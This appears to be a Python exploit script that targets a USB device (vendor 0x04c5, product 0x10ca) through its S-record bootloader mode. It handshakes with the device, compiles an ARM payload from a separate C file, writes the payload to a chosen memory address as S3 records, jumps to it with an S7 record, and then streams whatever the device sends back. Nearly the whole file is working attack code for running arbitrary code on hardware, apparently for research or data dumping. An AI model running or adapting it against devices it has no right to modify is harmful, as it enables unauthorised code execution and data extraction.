import argparse
import usb.core
import usb.util
import time
import os.path
import tempfile
import subprocess
import struct
import tqdm
import sys


PAYLOAD_PATH = os.path.dirname(os.path.realpath(__file__))
LINKER = """
ENTRY(start)

SECTIONS
{
  . = BASE;

  .text     : { *(.text.start) *(.text   .text.*   .gnu.linkonce.t.*) }
  .rodata   : { *(.rodata .rodata.* .gnu.linkonce.r.*) }
  .bss      : { *(.bss    .bss.*    .gnu.linkonce.b.*) *(COMMON) }
  .data     : { *(.data   .data.*   .gnu.linkonce.d.*) }
  /DISCARD/ : { *(.interp) *(.dynsym) *(.dynstr) *(.hash) *(.dynamic) *(.comment) }
}
"""

COMPILE = ["arm-none-eabi-gcc", "-c", "-Os", "-march=armv4", "-ffixed-r4", "-ffixed-r5", "-fno-builtin-printf", "-fno-strict-aliasing", "-fno-builtin-memcpy", "-fno-builtin-memset", "-fno-builtin", "-I", PAYLOAD_PATH]
LINK = ["arm-none-eabi-gcc", "-nodefaultlibs", "-nostdlib"]
OBJCOPY = ["arm-none-eabi-objcopy", "-O", "binary"]


class PayloadBuilder:

    def __init__(self, srcfile):
        with open(os.path.join(PAYLOAD_PATH, srcfile)) as inf:
            self.src = inf.read()

    def build(self, **kwargs):
        base = kwargs["base"]
        src = self.src
        for arg, replacement in kwargs.items():
            src = src.replace("%{}%".format(arg), str(replacement))

        with tempfile.TemporaryDirectory() as tmp:
            p_linker_x = os.path.join(tmp, "linker.x")
            p_payload_c = os.path.join(tmp, "payload.c")
            p_payload_o = os.path.join(tmp, "payload.o")
            p_payload = os.path.join(tmp, "payload")
            p_payload_bin = os.path.join(tmp, "payload.bin")

            with open(p_linker_x, "w") as outf:
                outf.write(LINKER.replace("BASE", hex(base)))
            with open(p_payload_c, "w") as outf:
                outf.write(src)
            subprocess.check_output(COMPILE + ["-o", p_payload_o, p_payload_c])
            subprocess.check_output(LINK + ["-T", p_linker_x, "-o", p_payload, p_payload_o])
            subprocess.check_output(OBJCOPY + [p_payload, p_payload_bin])
            with open(p_payload_bin, "rb") as inf:
                payload = inf.read()
        return payload


def make_srec(dst, data):
    payload_sz = 1 + 4 + len(data)
    assert payload_sz < 0x100

    payload = bytearray(payload_sz)
    payload[0] = payload_sz
    payload[1:5] = struct.pack(">I", dst)
    payload[5:] = data

    assert len(payload) == payload_sz

    return "S3" + payload.hex() + bytes([~(sum(payload) & 0xFF) & 0xFF]).hex()


def make_s7(dst):
    payload_sz = 1 + 4
    assert payload_sz < 0x100

    payload = bytearray(payload_sz)
    payload[0] = payload_sz
    payload[1:5] = struct.pack(">I", dst)

    assert len(payload) == payload_sz

    # print(payload.hex())

    return "S7" + payload.hex() + bytes([~(sum(payload) & 0xFF) & 0xFF]).hex()


class Exploit:

    def __init__(self):
        parser = argparse.ArgumentParser()
        parser.add_argument('--addr', type=lambda x: int(x, 16), required=True)

        args = parser.parse_args()

        self.args = args

    def run(self):
        while True:
            self.dev = usb.core.find(idVendor=0x04c5, idProduct=0x10ca)
            if self.dev is not None:
                break

            if self.dev is None:
                print("Waiting for srec mode...")
                time.sleep(1)
            else:
                break

        self.dev.ctrl_transfer(0x41, 0x62, 0x00, 0, b"\x02\xC0")
        self.dev.ctrl_transfer(0x41, 0x60, 0xC0, 0)
        self.dev.write(3, bytes.fromhex("FF 55 00 42 00 01 01 FE"))
        handshake = bytearray(self.dev.read(0x82, 4096))
        assert handshake == bytes.fromhex("4442800000000008")

        print("In srec mode")
        print("Manufacturer : {}".format(usb.util.get_string(self.dev, self.dev.iManufacturer)))
        print("Product      : {}".format(usb.util.get_string(self.dev, self.dev.iProduct)))

        print("Writing payload at 0x{:08X}".format(self.args.addr))
        payload = PayloadBuilder("g1_secondary.c").build(base=self.args.addr)
        # 4k to try bursting the cache
        payload += b"\x00" * (4 * 1024 - len(payload))

        for x in range(0, len(payload), 0x80):
            data = make_srec(self.args.addr + x, payload[x:x+0x80])
            assert self.dev.write(3, data) == len(data)

        self.dev.write(3, make_s7(self.args.addr))

        print("Waiting for the device to disconnect...")
        while True:
            dev = usb.core.find(idVendor=0x04c5, idProduct=0x10ca)
            if dev is None:
                break
            time.sleep(0.01)

        print("Waiting for the device to reconnect...")
        while True:
            dev = usb.core.find(idVendor=0x04c5, idProduct=0x10ca)
            if dev is not None:
                time.sleep(1)
                dev = usb.core.find(idVendor=0x04c5, idProduct=0x10ca)
                break
            time.sleep(0.01)
        self.dev = dev

        print("Handshake with payload")
        self.dev.write(3, b"\xBB")
        handshake = bytearray(self.dev.read(0x82, 4096))
        assert handshake == b"\xAA\xBB\xCC\xDD"

        print("success!")
        print("-" * 80)

        self.dev.write(3, b"\xAA")

        while True:
            try:
                data = self.dev.read(0x82, 4096)
            except usb.core.USBTimeoutError:
                time.sleep(0.1)
                continue
            sys.stdout.buffer.write(bytearray(data))
            sys.stdout.flush()
            self.dev.write(3, b"\xAA")


def main():
    Exploit().run()


if __name__ == "__main__":
    main()
